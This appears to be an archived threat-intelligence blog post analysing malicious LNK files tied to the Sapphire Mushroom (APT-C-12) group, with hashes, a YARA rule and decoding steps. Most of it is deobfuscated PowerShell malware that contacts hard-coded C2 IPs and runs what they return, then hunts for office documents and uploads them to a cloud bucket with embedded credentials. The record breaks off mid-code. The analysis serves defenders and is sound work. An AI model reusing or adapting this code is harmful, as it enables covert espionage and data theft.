{
    "id": "ff5fe13d-8492-4bd0-ab50-df60284e0ee9",
    "created_at": "2023-01-12T15:01:19.760612Z",
    "updated_at": "2025-03-27T02:13:49.171046Z",
    "deleted_at": null,
    "sha1_hash": "42b79dbfecaafeb5d7d25a62c786f465decffd5d",
    "title": "2020-02-10 - Suspected Sapphire Mushroom (APT-C-12) malicious LNK files",
    "authors": "",
    "file_creation_date": "2022-05-28T15:45:56Z",
    "file_modification_date": "2022-05-28T15:45:56Z",
    "file_size": 651972,
    "plain_text": "# Suspected Sapphire Mushroom (APT-C-12) malicious LNK files\n\n**bitofhex.com/2020/02/10/sapphire-mushroom-lnk-files/**\n\n\nFebruary 10, 2020\n\nIn July 2018, the Chinese-based research group 360 Technical Intelligence Center (TIC) produced a report “蓝宝菇（APT-C-12）针对性攻击技\n术细节揭秘” (Sapphire Mushroom (APT-C-12) Technical Details Revealed )1 . This report analysed a malicious LNK file allegedly used by the\n[APT group “Sapphire Mushroom” (蓝宝菇 aka Blue Mushroom aka NuclearCrisis). The group, according to 360 TIC:](https://mp.weixin.qq.com/s?__biz=MzU0NDk0NTAwMw==&mid=2247490118&idx=3&sn=ae1b036a1c1263142bb350cb21057bc4)\n\n…has carried out continuous cyber espionage activities on key units and departments of the Chinese government, military industry,\nscientific research, and finance. The organization focuses on information related to the nuclear industry and scientific research. The\ntargets were mainly concentrated in mainland China…[M]ore than 670 malware samples have been collected from the group, including\nmore than 60 malicious plugins specifically for lateral movement; more than 40 C2 domain names and IPs related to the organization\nhave also been discovered.\n\nThe group appeared in March 2011 and appears to be targeting a wide variety of Chinese government and industries with spear-phishing\n[emails. An early tactic used right-to-left override (RTLO or RLO) character to give the appearance of a regular file, and also malicious LNK](https://attack.mitre.org/techniques/T1036/)\nfiles.\n\nThere is limited background I can find publicly on this group. They are not listed by that name or any variant on the APT Groups and\nOperations Spreadsheet. I also don’t have access to much private threat intelligence to trawl against. 360 TIC does not make a country\nattribution (that I can find) in its reports.\n\nWhat is [publicly written is singled-sourced from 360 TIC and helpfully translated by](https://mp.weixin.qq.com/s?__biz=MzU0NDk0NTAwMw==&mid=2247490118&idx=3&sn=ae1b036a1c1263142bb350cb21057bc4) [@Viking_Sec](https://twitter.com/Viking_Sec)\n\n## It’s the ‘L’ to the ‘N’ to the ‘K’\n\nFlash-forward to January 2020 and I was trawling through Hybrid-Analysis searching for interesting LNK files, I came across these five\nsamples:\n\nAnalysis indicates one of these samples is very similar to the same analysed in the 360 TIC report (of which the hash was not released) and\nthe other four were previously unreported. Further, looking at the samples it is possible targets can be identified based on the malware although this is not confirmed at this time.\n\nSo, with a combination of thread-pulling and reviewing the original 360 TIC report we can look at how these samples are related and any\nfurther information that might be interesting.\n\n## The Famous Five (LNKs)\n\nWhat immediately stood out to me was the enormous size of these LNK files: between 400KB to 1.3 MB. Which is massive for such a\n(normally) little file. This generally indicates data is appended to the end of the file. If it’s larger than normal then it’s often a PE executable that\nis simply extracted out. How wrong I was.\n\nWhat was also interesting is all of these samples were Chinese-language named and uploaded to Hybrid-Analysis at about the same time. The\nsummary is as follows:\n\n**Date of**\n**Upload** **File Name** **Google Translation** **SHA256 Hash**\n\n\n-----\n\nOctober 29th\n2019\n11:00:46\n(UTC)\n\nOctober 29th\n2019\n11:03:47\n(UTC)\n\nOctober 29th\n2019\n12:40:00\n(UTC)\n\nOctober 29th\n2019\n12:40:33\n(UTC)\n\nOctober 29th\n2019\n12:40:54\n(UTC)\n\n\n20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814\n\nb0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b\n\n70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d\n\nea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af\n\n6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36\n\n\n陈婧简历+作\n品.lnk\n\n周文重：2018\n博鳌亚洲论坛\n感谢函.lnk\n\n【2018前海合\n作论坛】.lnk\n\n《政法网络舆\n情》会员申\n请.lnk\n\n《观察者网》\n采访提纲暨相\n关新闻附件.lnk\n\n\nChen Jing s resume +\nworks\n\nZhou Wenzhong: Thank\nyou letter for Boao Forum\nfor Asia 2018\n\nQianhai Cooperation\nForum 2018\n\n\"Politics and Law\nNetwork Public Opinion\"\nMember Application\n\n\"Observer Network\"\nInterview Outline and\nRelated News\nAttachments\n\n\nThe second-last sample (SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af) is very similar to that\nanalysed in the 360 TIC report. This is based on basic characteristics including: filename, file size, reported strings, reported C2 and exfiltration\ndomains, and secondary dropped malware.\n\n## A Quick Comparison\n\nRunning the five samples through Eric Zimmerman’s LECMD and comparing their overall hex content indicated they were likely related. Points\nof interest included:\n\nAll had much of their metadata wiped including internal dates and times, MAC addresses, and Volume Serial Numbers. This itself is an\nanomaly that is [a useful tool mark to match samples.](https://windowsir.blogspot.com/2018/07/lnk-toolmarks.html)\nWhat wasn’t wiped was the Security Identifier (SID) for each of the LNK files which indicated the user account from which the LNK file\nwas created:\n\n**SHA256 Hash** **SID**\n\n20ad6fa72982a6ba0f9499361b2aa3a3f5cca73fd397c2969d08a4c5f2866814 S-1-5-21-768223713-132671932-3453716105-7998\n\nb0d7118d75c0f2a99fa5b319148b89148800e5db06ee403d6a31c451a8a54f2b S-1-5-21-768223713-132671932-3453716105-8001\n\n70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d S-1-5-21-768223713-132671932-3453716105-7998\n\nea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af S-1-5-21-768223713-132671932-3453716105-7998\n\n6ccad83fb9f7a50ac95e3e865a27be0288279e76fcd3b5af495c6fcf6d58fa36 S-1-5-21-768223713-132671932-3453716105-7998\n\nSo, all the samples were created on the same Windows environment and all but one was created with the same user account. Maybe they let\nthe intern have a go?\n\nThis would be a good Yara rule to start a hunt:\n```\nrule LNK_Based_on_SID\n{\n     meta:\n          sample = \"70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d\"\n          author = \"@mattnotmax\"\n          date = \"2020-01-23\"\n     strings:\n          $SID = \"S-1-5-21-768223713-132671932-3453716105\" wide\n     condition:\n          filesize > 400KB and \n          uint16(0) == 0x4c and \n          $SID\n}\n\n```\nOnly one sample (70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d) had been uploaded to Virus Total about the\nsame time as the Hybrid-Analysis uploads: 29 October 2019 at 12:43:22 UTC. At the time of writing it registered 16/58 detections, but all were\nnon-specific Trojan detections.\n\n\n-----\n\n## Malicious Script Delivery\n\nAll the LNK files also have similar PowerShell delivery: a plethora of white space to hide a PowerShell encoded commanded from the user,\nfollowed by a Base64 encoded script.\n\n\n-----\n\nThe five payloads are:\n```\n-w hidden\n$r='LWpvaW4oKDM2LDU3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwx\n lm8{param($v);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($v)))}lm8 $r\n-w hidden\n$6='LWpvaW4oKDM2LDQ5LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwx\n wr1{param($3);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($3)))}wr1 $6\n-w hidden\n$3='LWpvaW4oKDM2LDUwLDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwx\n n00{param($z);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($z)))}n00 $3\n-w hidden\n$5='LWpvaW4oKDM2LDEwMSw2MSwzNiwxMDQsMTExLDExNSwxMTYsNDYsMTE3LDEwNSw0NiwxMTQsOTcsMTE5LDExNywxMDUsNDYsMTE5LDEwNSwxMTAsMTAwLDExMSwxMTks\n sj7{param($z);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($z)))}sj7 $5\n-w hidden\n$o='LWpvaW4oKDM2LDk3LDYxLDM2LDEwNCwxMTEsMTE1LDExNiw0NiwxMTcsMTA1LDQ2LDExNCw5NywxMTksMTE3LDEwNSw0NiwxMTksMTA1LDExMCwxMDAsMTExLDExOSwx\n q64{param($6);iex ([text.encoding]::utf8.getstring([convert]::frombase64string($6)))}q64 $o\n\n```\nWhen converted from Base64 there is another layer of CharCode (Unicode character numbers):\n\n\n-----\n\n```\njoin((36,57,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36\n{[int]$_-AS[char]})|iex\njoin((36,49,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36\n{[int]$_-AS[char]})|iex\njoin((36,50,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36\n{[int]$_-AS[char]})|iex\njoin((36,101,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,3\n{[int]$_-AS[char]})|iex\njoin((36,97,61,36,104,111,115,116,46,117,105,46,114,97,119,117,105,46,119,105,110,100,111,119,116,105,116,108,101,59,73,102,40,33,36\n{[int]$_-AS[char]})|iex\n\n```\n[The above two rounds of obfuscation can be decoded using CyberChef goodness:](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Regular_expression('User%20defined','%5B0-9%5D%7B2,3%7D',true,true,false,false,false,false,'List%20matches')From_Charcode('Space',16))\n```\n[{\"op\":\"Regular expression\",\"args\":[\"User defined\",\"[a-zA-Z0-9+=/]{30,}\",true,true,false,false,false,false,\"List matches\"]},\n{\"op\":\"Fork\",\"args\":[\"\\\\n\",\"\\\\n\\\\n\\\\n\",false]},{\"op\":\"From Base64\",\"args\":[\"A-Za-z0-9+/=\",true]},{\"op\":\"Regular expression\",\"args\":\n[\"User defined\",\"([0-9]{2,3})\",true,true,false,false,false,false,\"List matches\"]},{\"op\":\"Find / Replace\",\"args\":\n[{\"option\":\"Extended (\\\\n, \\\\t, \\\\x...)\",\"string\":\"\\\\n\"},\", \",true,false,true,false]},{\"op\":\"From Charcode\",\"args\":[\"Comma\",10]}]\n\n```\nThis reveals:\n```\n$9=$host.ui.rawui.windowtitle;If(!$9.endswith('.lnk')){$9+='.lnk'}$9=gi $9;lm8 (gc $9|select -l 1)\n$1=$host.ui.rawui.windowtitle;If(!$1.endswith('.lnk')){$1+='.lnk'}$1=gi $1;wr1 (gc $1|select -l 1)\n$2=$host.ui.rawui.windowtitle;If(!$2.endswith('.lnk')){$2+='.lnk'}$2=gi $2;n00 (gc $2|select -l 1)\n$e=$host.ui.rawui.windowtitle;If(!$e.endswith('.lnk')){$e+='.lnk'}$e=gi $e;sj7 (gc $e|select -l 1)\n$a=$host.ui.rawui.windowtitle;If(!$a.endswith('.lnk')){$a+='.lnk'}$a=gi $a;q64 (gc $a|select -l 1)\n\n```\nAll of these do the same thing: check the title text in the current window, rename that text to end in `.lnk if needed, then select the last line of`\nthe LNK file and extract it.\n\n## Babushka (LNK) Dolls\n\nExtracting out the last line of the LNK files reveals more Base64 encoded CharCode. Due to the length, I’ll copy one sample here and the\n[same CyberChef recipe can quickly deal with it:](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Regular_expression('User%20defined','%5B0-9%5D%7B2,3%7D',true,true,false,false,false,false,'List%20matches')From_Charcode('Space',16))\n\nHere’s the extracted and semi-clean PowerShell from sample 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d:\n\n\n-----\n\n```\nexpand /f:* \"$env:tmp\\xgihT.Z\" \"$env:tmp\\\";\ndel -fo \"$env:tmp\\xgihT.Z\";\nIf (test-path $env:tmp\\xgihT) {\n  del -fo -r \"$env:tmp\\xgihT\"\n  }\nrni -fo \"$env:tmp\\tmp\" \"xgihT\";\nmd -fo \"$env:AppData\\WinRAR\";\nmv -fo \"$env:tmp\\xgihT\\Rar.exe\" \"$env:AppData\\WinRAR\\\";\nmv -fo \"$env:tmp\\xgihT\\FLrzH.w\" \"$env:tmp\\..\\\";\nIf ($2.fullname.startswith($env:tmp)) {\n  del -fo -r (\"$env:tmp\\\"+$2.basename);\n  rni -fo \"$env:tmp\\xgihT\" $2.basename;\n  ii (\"$env:tmp\\\"+$2.basename+\"\\\")\n  }\nElse {\n  del -fo $2;\n  md -fo $2.basename;\n  mv -fo \"$env:tmp\\xgihT\\*\" $2.basename;\n  del -fo -r \"$env:tmp\\xgihT\";\n  ii \"$($2.basename)\\\"\n  }\nIf (test-path $env:tmp\\backups) {\n  If (((get-date)-(get-item $env:tmp\\backups).LastAccessTime).totalminutes -le 60) {\n    exit\n  }\n  del -fo -r \"$env:tmp\\backups\"\n}\nIf (test-path \"$env:tmp\\..\\FLrzH.w\") {\n  rundll32 \"$env:tmp\\..\\FLrzH.w\",DllRegister `\n  \"powershell -w hidden `\n  \"\"Function we8([String]`$3,`$7='MD5'){`$g=New-Object System.Text.StringBuilder;`\n    `$9=[System.Security.Cryptography.HashAlgorithm]::Create(`$7).ComputeHash([System.Text.Encoding]::UTF8.GetBytes(`$3));`\n    foreach(`$1 in `$9) {`\n      [Void]`$g.Append(`$1.ToString('x2'))`\n    }`\n    `$w=`$g.ToString();`\n    `$e=`$w.substring(0,12);`\n    return `$e}`\n    Function qv1 (`$3) {`\n      `$w=[System.Text.Encoding]::UTF8;`\n      `$x=`$w.GetBytes('s');`\n      `$s=`$(for(`$e=0;`\n      `$e -lt `$3.length;) {`\n        for(`$g=0;`$g -lt `$x.length;`$g++) {`\n          `$3[`$e] -bxor `$x[`$g];`\n          `$e++;If(`$e -ge `$3.Length) {`\n            `$g=`$x.length`\n          }`\n        }`\n      }`);`\n      `$7=`$w.GetString(`$s);`\n      return `$7`\n    }`\n    Function qc4 {`\n      `$s=0;`\n      `$q=`$m.length;`\n      while (1) {`\n          `[email protected]();`\n        `$7=Get-WmiObject win32_networkadapterconfiguration;`\n        foreach(`$zv7 in `$7) {`\n          If(`$zv7.macaddress) {`\n            `$w+=`$zv7.macaddress`\n          }`\n        }`\n          `[email protected]();`\n        foreach(`$ij4 in `$w) {`\n          If(`$ij4.contains(':')) {`\n            `$zv7+=`$ij4.substring(0,17) -replace ':',''`\n          }`\n        }`\n        `$zv7=`$zv7|sort;`\n        `$zy3=we8 (`$zv7[-1]+`$env:username);`\n        `$xi2=new-object System.Net.WebClient;`\n        `$xi2.headers.add('user-agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA)\nChrome/62.0.3202.94 Safari/.36');`\n        `$xi2.headers.add('Cookie','PHPSESSID='+`$zy3+'; csrftoken=u32t4o3tb3lbj'+`$v+'; _gat='+`$u+';');`\n        try {`\n          `$0=`$xi2.DownloadString(`$m[`$s]);`$ri8=`$0.split(' ');`\n          `$jd4= `$ri8.Length;`\n          `$qw2=new-object int[] `$jd4;`\n          for(`$e=0;`$e -lt `$jd4;`$e+=1) {`\n              `$qw2[`$e]=[int]`$ri8[`$e]`\n\n```\n\n-----\n\n```\n          `$0=qv1 `$qw2;iex `$0;`\n          while(1) {`\n            try {`\n              ROAGC `$8 `$u `$m `$a `$zy3`\n            }`\n            catch {}`\n          }`\n        }`\n        catch {`\n          If(`$s -lt (`$q-1)) {`\n            `$s+=1`\n          }`\n          Else {`\n            `$s=0`\n          }`\n        }`\n        Start-Sleep -s 180`\n      }`\n    }`\n    `$v='';`\n    `$0=[System.Text.Encoding]::Default.EncodingName;`\n    If(`$0.endswith('jis)')) {`\n      `$v='5'`\n    }`\n    Elseif(`$0.endswith('f-16)')) {`\n      `$v='4'`\n    }`\n    Elseif(`$0.endswith('M437)')) {`\n      `$v='3'`\n    }`\n    Elseif(`$0.endswith('g5)')) {`\n      `$v='1'`\n    }`\n    Elseif(`$0.endswith('12)')) {`\n      `$v='0'`\n    }`\n    Else {`$v='2'}`\n    `$0='http://159.65.74.97;http://159.65.127.93;http://128.199.73.43';`\n    `$m=`$0.split(';');`\n    `$a='o19JOAiPTbSozNpAcIRYRy20E/sAYzrJxFzmsAQTbBo=';`\n    `$u='REDACTED';`\n    `$8=10;`\n    `$0=-join(get-random ([char[]](65..90+97..122)) -c 7 -s `$([int](get-date -f yyyMd)));`\n    `$nl7=new-object system.threading.mutex(0,`$0);`\n    If (`$nl7.waitone(1)) {`\n      try {`\n        qc4`\n      }`\n      finally {`\n        `$nl7.releasemutex()`\n      }`\n    }`\n  \"\"\"\n}\nmd -fo \"$env:tmp\\backups\";\nFunction u65($9) {\n  [system.gc]::collect();\n  $6=[System.Net.WebRequest]::Create($9.Uri1);\n  $6.proxy=$Null;\n  $6.keepalive=$False;\n  $6.Method=$9.Method1;\n  If ($9.Header2.count) {\n    foreach($1 in $9.Header2.getenumerator()) {\n      If ($1.name) {\n        $6.Headers.Add($1.name, $1.value)\n      }\n    }  \n  }\n  $6.AllowAutoRedirect=$False;\n  $6.ContentLength=$9.Body.Length;\n  $x=$6.GetRequestStream();\n  $x.Write($9.Body,0,$9.Body.Length);\n  $t=$6.GetResponse();\n  If ($9.GData) {\n    $r=$t.GetResponseStream();\n    $e=New-Object System.IO.StreamReader $r;\n    $n=$e.ReadToEnd()\n    }\n  If ($t -ne $Null) {\n    $t.close()\n     }\n\n```\n\n-----\n\n```\n    $6.abort()\n    }\n  If ($9.GData) {\n    return ($t.statuscode,([xml]$n).InitiateMultipartUploadResult.UploadId)\n    }\n  return $t\n}\nFunction v95($2,$p) {\n  $e=New-Object System.Security.Cryptography.HMACSHA256;\n  $e.key=$2;$2=$e.ComputeHash([Text.Encoding]::utf8.GetBytes($p));\n  return $2\n}\nFunction y79($p) {\n  $9=[Security.Cryptography.HashAlgorithm]::Create(\"SHA256\");\n  $4=[Text.Encoding]::utf8.GetBytes($p);\n  $h=$9.ComputeHash($4);\n  return -join($h| % {\"{0:x2}\" -f $_})\n}\nFunction ww2($9) {\n  $c='/';\n  If ($9.DIRNAME) {\n    $c+=\"$($9.DIRNAME)/\"\n    }\n  If ($9.FILENAME) {\n    $c+=$9.FILENAME}$5='';\n    ($9.CANON_HEAD.keys | sort) | % {$5+=\"$($_):$($9.CANON_HEAD[$_])`n\"};\n    $0=\"$($9.METHOD)`n$c`n$($9.QUERYS)`n$5`n$($9.SIGNHEAD)`n$($9.BODY_SIG)\";\n    return \"AWS4-HMAC-SHA256`n$($9.ISODATE)`n$($9.DATE)/$($9.REGION)/s3/aws4_request`n$(y79 $0)\"\n}\nFunction i09($9) {\n    $c=[convert]::frombase64string('+ji52ydI8GAan3Xej2sIhMfPEEATEQjehjYt2Nh+ZqQ=');\n    $7=v95 $c $9.REGION;$i=v95 $7 \"s3\";\n    $s=v95 $i \"aws4_request\";\n    $2=v95 $s $9.CANON_REQ;return -join($2|%{\"{0:x2}\" -f $_})\n}\nFunction en2($9,$6,$7) {\n  $9.ISODATE='20180621T015829Z';\n  $9.DATE=$9.ISODATE.split('T')[0];[email protected]{\"host\"=$9.HOSTURL;\"x-amz-content-sha256\"=$9.BODY_SIG;\"x-amzdate\"=$9.ISODATE};\n  If ($9.FileMD5) {\n    $9.CANON_HEAD.add('content-md5',$9.FileMD5)\n  }\n  $9.SIGNHEAD=($9.CANON_HEAD.keys|sort) -join ';';\n  $9.CANON_REQ=ww2 $9;$9.CANON_SIG=i09 $9;\n  [email protected]{\"x-amz-content-sha256\"=$9.BODY_SIG;\"x-amz-date\"=$9.ISODATE;\"Authorization\"=\"AWS4-HMAC-SHA256\nCredential=$($9.ACCESS_KEY)/$($9.DATE)/$($9.REGION)/s3/aws4_request, SignedHeaders=$($9.SIGNHEAD),\nSignature=$($9.CANON_SIG)\"};If($9.FileMD5){$t.add('content-md5',$9.FileMD5)}$x=\"https://$($9.HOSTURL)/\";\n  If ($9.DIRNAME) {\n    $x+=\"$($9.DIRNAME)/\"\n  }\n  If ($9.FILENAME) {\n    $x+=$9.FILENAME\n  }\n  If ($9.QUERYS) {\n    $x+=\"?$($9.QUERYS)\"\n    }\n  [email protected]{Uri1=$x;Body=$6;Method1=$9.METHOD;Header2=$t;GData=$7};\n  return $b\n}\nFunction ts3($l,$x,$t) {\n  [email protected]\n{METHOD='POST';HOSTURL='05012.ams3.digitaloceanspaces.com';ACCESS_KEY='BVTTZPQUDF3W4Z7P3WTN';REGION='nyc3';DIRNAME=$x;FILENAME=$t.to\n  $3=$False;\n  $g=$False;\n  try {\n    $f=New-Object System.IO.FileStream $l.fullname, 'Open';\n    If ($f.Length -gt 5Mb) {\n      $g=$True;\n      $i=New-Object System.Xml.XmlDocument;\n      $4=$i.Createelement('CompleteMultipartUpload');\n      $9.QUERYS='uploads=';\n      $9.BODY_SIG=y79 '';\n      $b=en2 $9 '' $True;\n      $0=u65 $b;\n      $n=[int]$0[0];\n       $x=$0[1]\n\n```\n\n-----\n\n```\n  }\n  catch {}\n  If ($n -eq 200 -or -not $g) {\n    $t=0;\n    $o=0;\n    $h=1;\n    $2=5Mb;\n    try {\n      [byte[]]$6=New-Object byte[] $2;\n      while ($o -le 10) {\n        $o+=1;\n        $w=[Math]::Min($2,$f.Length-$t);\n        If ($w -lt $2) {\n          [byte[]]$6=New-Object byte[] $w\n        }\n        $q=$f.Read($6,0,$w);\n        If ($q -ne $w) {\n          break\n        }\n        $q=New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider;\n        $9.METHOD='PUT';\n        $9.BODY_SIG='UNSIGNED-PAYLOAD';\n        $9.FileMD5=[convert]::tobase64string($q.ComputeHash($6));\n        If ($g) {\n          $9.QUERYS=\"partNumber=$h&uploadId=$x\"\n        }\n        $b=en2 $9 $6 $False;\n        $0=u65 $b;\n        $n=[int]$0.StatusCode;\n        If ($n -eq 200) {\n          If ($g) {\n            $q=$i.Createelement('Part');\n            $p=$i.Createelement('PartNumber');\n            $p.innertext=$h;\n            [void]$q.appendchild($p);\n            $6=$i.Createelement('ETag');\n            $6.innertext=$0.Headers['etag'];\n            [void]$q.appendchild($6);\n            [void]$4.appendchild($q);\n            $h+=1;\n            $t+=$w\n          }\n          else {\n            $3=$True\n          }\n          If ($t -eq $f.Length) {\n            break\n          }\n        }\n        else {\n          If ($f.Position -ne $t) {\n            [void]$f.Seek($t,[System.IO.SeekOrigin]::Begin)\n          }\n        }\n      }\n      If ($g) {\n        $9.METHOD='POST';\n        $g=[byte[]][char[]]$4.outerxml;\n        $9.BODY_SIG=y79 $4.outerxml;\n        $9.QUERYS=\"uploadId=$x\";\n        $9.FileMD5='';\n        $b=en2 $9 $g $False;\n        $0=u65 $b;\n        If ([int]$0.StatusCode -eq 200) {\n          $3=$True\n        }\n      }\n    }\n    catch {\n    }\n  }\n  $f.Close();\n  $f.Dispose();\n  return $3\n}\nFunction x56($6,$g,$f) {\n  iex (\"& '$env:AppData\\WinRAR\\Rar.exe' a -ep1 -y -hp$6 '$g' '$f'\") | out-null;\n  If (!(test-path $g)) {\n    makecab \"$f\" \"$g\" | out-null\n  }\n}\n\n```\n\n-----\n\n```\nFunction zm7($l,$n,$g,$y,$x) {\n  $s=\"[\"+$g+\"] \"+($l.fullName)+\"   Size:\"+($l.Length/1kb)+\"KB   Time:\"+($l.LastWriteTime);\n  Try {\n    gc $l.fullname -fo -total 0 -erroraction stop;\n    $7=$True;\n    If ($l.extension -eq '.txt' -and $l.Length -gt 10KB) {\n      $7=$False\n    }\n    If ($n -eq $_.Length) {\n      $7=$False\n    }\n    If ($l.Length -le 100MB -and $l.Length -gt 0 -and $7) {\n      $9=\"$env:tmp\\backups\\$g.rar\";\n      x56 $j $9 $l.fullName;\n      If (test-path $9) {\n        $9=gi -fo $9\n      }\n      Else {\n        $9=$l\n      }\n      If (ts3 $9 $x $y) {\n        $s+=\" ($y)OK`r`n\";\n        sleep -s 1\n      }\n      Else {\n        $s+=\" (Error)`r`n\"\n      }\n      If ($9.extension -eq '.rar') {\n        del -fo $9.fullname\n      }\n    }\n    Else {\n      $s+=\"[!Size or Duplicate!]`r`n\"\n    }\n  }\n  Catch {\n    $s+=\"[!Access denied!!]`r`n\"\n  }\n  return $s\n}\nFunction sr2($j,$x) {\n  $6=180;\n  $y=1;\n  $b=0;\n  $e=(Get-Date -f yyyyMMddhhmmss)+\"`r`nWeek:`r`n\";\n  $n=0;\n  $f=('.doc','.docx','.pdf','.ppt','.pptx','.xls','.xlsx','.wps','.wpp','.et','.txt');\n  gci \"$env:appdata\\Microsoft\\Windows\\Recent\\\" -fo -errora silentlycontinue | ? { $f -contains\n[io.path]::getextension($_.basename) -and $_.LastWriteTime -ge (Get-Date).AddDays(-7)} | % {gi ((new-object -com\nwscript.shell).createshortcut($_.fullname)).targetpath -fo -errora silentlycontinue} | % {$b+=1;$e+=zm7 $_ $n $b $y\n$x;$n=$_.Length;\n    If ($e.endswith(\"OK`r`n\")) {\n      $y+=1\n    }};\n     [email protected]();\n    $5+=gdr -p 'fi*' | ? {$_.root -ne \"$env:systemdrive\\\"} | % {gci -fo $_.root};\n    $5+=gci -fo \"$env:systemdrive\\users\";\n    $5+=gci -fo \"$env:systemdrive\\\" | ? {$_.fullname -notlike '*:\\Windows*' -and $_.fullname -notlike '*:\\Users' -and\n$_.fullname -notlike '*:\\Program Files*' -and $_.fullname -notlike '*:\\ProgramData' -and $_.fullname -notlike '*:\\MSOCache' -and\n$_.fullname -notlike '*:\\PerfLogs' -and $_.fullname -notlike '*:\\System Volume*' -and $_.fullname -notlike '*:\\Documents and\nSettings' -and $_.fullname -notlike '*:\\Recovery' -and $_.fullname -notlike '*:\\Boot'};\n    $5=$5 | sort lastwritetime -des | % {$_.fullname} | ? {$_};\n    $e+=\"Search List:`r`n$5`r`n\";\n    $c=0;\n    If ($6 -ge 30){\n      $r=30\n    }\n    Else {\n      $r=$6\n    }\n    $p=Get-Date;\n    $k=1;\n    $n=0;\n    while ($6 -ge $r) {\n      $e+=\"M $k (D $c - D $r):`r`n\";\n      foreach ($d in (('.doc','.docx','.pdf'),('.ppt','.pptx','.xls','.xlsx','.wps','.wpp','.et'),('.txt','.eml'))) {\n        $e+=\"FileType: $d`r`n\";\n        foreach ($4 in $5) {\n          Try {\n            gci $4 -r -fo -errora silentlycontinue | ? {$d -contains $_.extension -and $_.LastWriteTime -lt\n$p AddDays( 1*$c) and $ LastWriteTime ge $p AddDays( 1*$r) } | % {$b+=1;$e+=zm7 $ $n $b $y $x;$n=$ Length;\n\n```\n\n-----\n\n```\n                $y+=1\n              }\n            }\n          }\n          catch {\n            $e+=\"[!!!$4 search error !!!]`r`n\"\n          }\n        }\n      }\n      $e+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\";\n      $e+=(get-wmiobject win32_process -f \"name='powershell.exe'\" | % {$_.commandline+\"`r`n\"});\n      $e > \"$env:tmp\\$($k)test.txt\";\n      $e=\"$env:tmp\\$($k)test.txt\";\n      x56 $j \"$env:tmp\\backups\\M$k.rar\" $e;\n      ts3 (gi -fo \"$env:tmp\\backups\\M$k.rar\") $x \"M$k\";\n      del -fo $e,\"$env:tmp\\backups\\M$k.rar\";\n      $e='';\n      If ($6 -le $r) {\n        break\n      }\n      $r+=30;\n      $c+=30;\n      If ($6 -le $r) {\n        $r=$6\n      }\n      $k+=1\n    }\n    $p=0;\n    $k=0;\n  while(1) {\n    sleep -s 3500;\n    md -fo \"$env:tmp\\backups\";\n    $x=(hostname)+\"_P\"+(Get-Date -f yyyyMMddhhmmss)+\"_REDACTED\";\n    $y=1;$n=0;$k+=1;$e=\"$x`r`n\";\n    gci \"$env:appdata\\Microsoft\\Windows\\Recent\\\" -fo -errora silentlycontinue | ? {$f -contains\n[io.path]::getextension($_.basename) -and $_.LastWriteTime -ge (Get-Date).AddHours(-1) } | % {gi ((new-object -com\nwscript.shell).createshortcut($_.fullname)).targetpath -fo -errora silentlycontinue} | % {$b+=1;$e+=zm7 $_ $n $b $y\n$x;$n=$_.Length;\n      If ($e.endswith(\"OK`r`n\")) {\n        $y+=1\n      }\n    };\n    $f='';\n    $e+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\";\n    $e > \"$env:tmp\\$($k)test.txt\";\n    $e=\"$env:tmp\\$($k)test.txt\";\n    x56 $j \"$env:tmp\\backups\\P$k.rar\" $e;\n    ts3 (gi -fo \"$env:tmp\\backups\\P$k.rar\") $x \"P$k\";\n    del -fo $e,\"$env:tmp\\backups\\P$k.rar\"\n  }\n}\n[System.Net.ServicePointManager]::DefaultConnectionLimit=50;[System.Net.ServicePointManager]::ServerCertificateValidationCallback=\n{$true};\n$s=(hostname)+\"_\"+(Get-Date -f yyyyMMddhhmmss)+\"_REDACTED\";\n$m='http://159.65.74.97;http://159.65.127.93;http://128.199.73.43';\n$p=$m.split(\";\");\n$q=$p.length;\n$l=0;\n$w=\"\";\nwhile ($l -lt $q) {\n  try {\n    $9=[System.Net.WebRequest]::Create($p[$l]);\n    $w+=$l.ToString();\n    $3=$9.GetResponse();\n    $w+=\" OK`r`n\"\n  }\n  catch {\n    $w+=\" BAD!`r`n\"\n  }\n  $l+=1\n}\n$w+=(Get-Date -f 